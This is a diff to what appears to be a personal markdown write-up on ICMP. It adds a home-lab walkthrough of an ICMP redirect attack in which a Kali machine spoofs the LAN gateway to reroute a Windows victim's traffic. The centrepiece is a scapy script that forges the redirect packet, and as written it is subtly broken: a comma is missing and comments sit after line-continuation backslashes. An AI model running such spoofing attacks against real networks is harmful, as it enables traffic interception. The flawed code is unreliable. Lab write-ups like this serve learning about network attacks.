@@ -44,7 +44,7 @@ And a bonus message.
 
 ## Codes
 
-Codes are just like types, but for types. Each message type has different codes that are used to define even more what is the problem. Like, message type `Redirect` has 4 codes (0, 1, 2, 3) that tell it to redirect for a whoe network, a specific host, a specific service from a networ or a specific service from a host. 
+Codes are just like types, but for types. Each message type has different codes that are used to define even more what is the problem. Like, message type `Redirect` has 4 codes (0, 1, 2, 3) that tell it to redirect for a whole network (0), a specific host(1), a specific service from a network (2) or a specific service from a host (3). 
 
 `Destination Unreachable` also has codes (0, 1, 2, 3, 4, 5) for if a net (0), host (1), protocol (2) or a port (3) are unreachable, fragmentation mishap (4) or a routing failure (5).
 
@@ -60,5 +60,51 @@ The reserved 32 bit buffer is allocated according the type and code, if `Redirec
 
 An ICMP redirection attack takes advantage of the ICMP redirect message, and an attacker tries to place himself as a gateway for a victim machine on the local network. It is very simple. Here is the network layout:
 
-![Network map, Kali IP change to .4 instead of .5]()
+![Network map, Kali IP change to .4 instead of .5](/Pictures/Network_Map.png)
 
+The Attacker is the Kali machine (192.168.100.5), My victim is the 'Win10 - 01' machine (192.168.100.1) and the machine I am going to gateway to is the DC (192.168.50.1). Now, let's craft ourself a redirect packet.
+
+*click click*... *keyboard noises*... *Head slaminh against desk*... *more keyboard noises*...
+
+Anddddd there we go!
+
+```
+# ICMP Redirect Attack.py
+# 05.02.2023
+# By Timon
+
+# Imports
+from scapy.all import *
+
+# Constants
+VICTIM_IP   = "192.168.100.1"
+REAL_GW     = "192.168.100.254"
+ATTACKER_GW = "192.168.100.4"
+TARGET_NET  = "192.168.50.1"
+ICMP_TYPE   = 5
+ICMP_CODE   = 1
+
+def main():
+    malicious_icmp = IP(\
+                        src=REAL_GW,\       # I pose as the default gateway of the LAN.
+                        dst=VICTIM_IP)/\    # Send it to the victim.
+                     ICMP(\
+                        type=ICMP_TYPE,\    # Enter type and code.
+                        code=ICMP_CODE\
+                        gw=ATTACKER_GW)/\   # GW tells victim what gw to route to instead.
+                     IP(\
+                        src=VICTIM_IP,\     # ICMP require the header of the IP pacet it is
+                        dst=TARGET_NET)     # related to. Here we forge an IP header.
+    
+    send(malicious_icmp)                    # Send the packet on the wire!
+
+if (__name__ == "__main__"):
+    main()
+```
+A python script using scapy, creates a redirect icmp packet and sends it.
+
+At first it did not work, and I didn't know why. The script was perfect and the victim machine recieved the packet, so it was very fraustrating ;-; . But then I found the problem!
+
+Exhibit 1 madafaka, this bitch!
+
+![Default rule for ICMPv4 traffic](\Pictures\Old_Firewall_Rule.PNG)
